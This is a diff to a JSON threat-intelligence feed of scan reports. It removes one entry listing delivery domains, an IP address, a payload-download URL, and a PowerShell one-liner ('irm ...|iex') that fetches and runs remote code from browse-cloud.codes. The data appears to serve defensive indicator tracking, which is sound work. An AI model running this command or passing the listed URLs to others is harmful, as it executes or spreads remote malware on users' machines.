@@ -2118,30 +2118,5 @@
     ],
     "ReportId": "cmwdfg5is03uq0oml2mt1nbdk",
     "ScannedAt": "2026-11-12T10:50:52.751000+00:00"
-  },
-  {
-    "UrlDomain": "lockerstoday.com",
-    "DeliveryUrl": [
-      "waysmakeyourlifebetter.com",
-      "goodpersonofourcentury.com",
-      "besthappyfamily.com",
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "160.153.174.190"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/e058fa21b0d6398a",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/e058fa21b0d6398a'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/e058fa21b0d6398a"
-    ],
-    "ReportId": "cmwdd8ni903ki0oml708xi8pf",
-    "ScannedAt": "2026-11-12T09:49:03.263000+00:00"
   }
 ]
